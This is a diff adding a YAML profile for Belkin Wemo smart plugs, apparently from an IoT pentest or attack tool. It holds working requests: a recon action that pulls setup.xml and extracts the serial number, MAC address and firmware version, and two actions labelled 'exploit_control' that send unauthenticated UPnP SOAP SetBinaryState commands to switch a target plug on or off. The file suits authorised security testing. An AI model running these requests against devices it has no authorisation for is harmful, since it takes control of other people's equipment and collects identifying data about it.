@@ -1,0 +1,66 @@
+id: wemo
+device_type: smart_plug
+vendor: Belkin Wemo
+family: wemo
+requires: {}
+actions:
+  - id: dump-info
+    label: "Dump device description"
+    category: recon
+    dangerous: false
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:49152/setup.xml"
+          save_as: dd
+      - extract:
+          from: $dd
+          fields:
+            friendlyName: '<friendlyName>([^<]+)</friendlyName>'
+            modelName: '<modelName>([^<]+)</modelName>'
+            firmwareVersion: '<firmwareVersion>([^<]+)</firmwareVersion>'
+            serialNumber: '<serialNumber>([^<]+)</serialNumber>'
+            macAddress: '<macAddress>([^<]+)</macAddress>'
+
+  - id: toggle-on
+    label: "Turn ON (SetBinaryState=1)"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "Turn the Wemo plug/switch ON?"
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:49153/upnp/control/basicevent1"
+          method: POST
+          headers:
+            Content-Type: 'text/xml; charset="utf-8"'
+            SOAPACTION: '"urn:Belkin:service:basicevent:1#SetBinaryState"'
+          body: |
+            <?xml version="1.0" encoding="utf-8"?>
+            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">
+              <s:Body>
+                <u:SetBinaryState xmlns:u="urn:Belkin:service:basicevent:1">
+                  <BinaryState>1</BinaryState>
+                </u:SetBinaryState>
+              </s:Body>
+            </s:Envelope>
+
+  - id: toggle-off
+    label: "Turn OFF"
+    category: exploit_control
+    dangerous: true
+    confirm_prompt: "Turn the Wemo plug/switch OFF?"
+    steps:
+      - http_request:
+          url: "http://{{target.ip}}:49153/upnp/control/basicevent1"
+          method: POST
+          headers:
+            Content-Type: 'text/xml; charset="utf-8"'
+            SOAPACTION: '"urn:Belkin:service:basicevent:1#SetBinaryState"'
+          body: |
+            <?xml version="1.0" encoding="utf-8"?>
+            <s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/">
+              <s:Body>
+                <u:SetBinaryState xmlns:u="urn:Belkin:service:basicevent:1">
+                  <BinaryState>0</BinaryState>
+                </u:SetBinaryState>
+              </s:Body>
+            </s:Envelope>
